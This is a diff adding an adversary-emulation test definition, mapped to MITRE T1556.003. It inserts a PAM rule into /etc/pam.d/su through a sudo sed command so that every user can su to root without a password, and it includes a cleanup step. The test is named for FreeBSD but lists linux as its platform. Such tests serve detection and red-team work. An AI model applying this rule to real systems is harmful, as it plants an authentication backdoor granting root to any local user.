@@ -1,0 +1,38 @@
+api_version: "2.0"
+name: Malicious PAM rule (freebsd)
+description: |
+    Inserts a rule into a PAM config and then tests it.
+
+    Upon successful execution, this test will insert a rule that allows every user to su to root without a password.
+args:
+    - name: pam_rule
+      type: string
+      default: auth sufficient pam_succeed_if.so uid >= 0
+    - name: index
+      type: integer
+      default: "8"
+    - name: path_to_pam_conf
+      type: string
+      default: /etc/pam.d/su
+uuid: b17eacac-282d-4ca8-a240-46602cf863e3
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1556: Modify Authentication Process'
+    subtechniques:
+        - 'T1556.003: Pluggable Authentication Modules'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: malicious-pam-rule-(freebsd)
+      inline: |
+        sudo sed -i "" "{{.Args.index}}s,^,{{.Args.pam_rule}}\n,g" {{.Args.path_to_pam_conf}}
+      executor: sh
+      cleanup:
+        inline: |
+            sudo sed -i "" "/{{.Args.pam_rule}}/d" {{.Args.path_to_pam_conf}}
+        executor: sh
